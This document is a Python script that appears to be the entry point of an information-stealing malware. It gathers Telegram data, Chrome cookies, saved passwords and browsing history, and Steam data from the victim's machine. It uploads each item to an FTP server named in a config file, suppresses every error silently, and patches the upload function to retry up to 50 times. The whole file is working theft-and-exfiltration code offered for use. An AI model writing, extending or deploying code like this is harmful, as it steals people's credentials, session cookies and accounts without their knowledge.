import stealers
import config
from os import path
from ftplib import FTP
import traceback

def _storbinary(self, *args, count = 50, **kwargs):
	if count < 1:
		raise ValueError(f"Count must be greate than 0, have {count}")
	cash = None
	for i in range(count):
		try:
			return self._storbinary(*args, **kwargs)
		except ConnectionResetError as e:
			cash = e
	raise cash

FTP._storbinary = FTP.storbinary
FTP.storbinary = _storbinary

def main():
	# FTP module to connect server
	ftp = FTP()
	ftp.set_debuglevel(config.LOG_LEVEL)
	ftp.connect(config.ADDRESS_HOST, config.ADDRESS_PORT)
	ftp.login(config.LOGIN, config.PASSWORD)
	ftp.cwd(config.FOLDER)

	try:
		telegram = stealers.telegram.steal()
		ftp.storbinary(f"STOR {path.basename('telegram.zip')}", telegram, config.BUFFER_SIZE)
	except:
		pass

	try:
		chrome_cookies = stealers.chrome.cookies.steal()
		ftp.storbinary(f"STOR {path.basename('chrome.cookies.sqlite')}", chrome_cookies, config.BUFFER_SIZE)
	except:
		pass

	try:
		chrome_passwords = stealers.chrome.passwords.steal()
		ftp.storbinary(f"STOR {path.basename('chrome.passwords.sqlite')}", chrome_passwords, config.BUFFER_SIZE)
	except:
		pass

	try:
		chrome_history = stealers.chrome.history.steal()
		ftp.storbinary(f"STOR {path.basename('chrome.history.sqlite')}", chrome_history, config.BUFFER_SIZE)
	except:
		pass

	try:
		steam = stealers.steam.steal()
		ftp.storbinary(f"STOR {path.basename('steam.zip')}", steam, config.BUFFER_SIZE)
	except:
		pass

if __name__ == "__main__":
	main()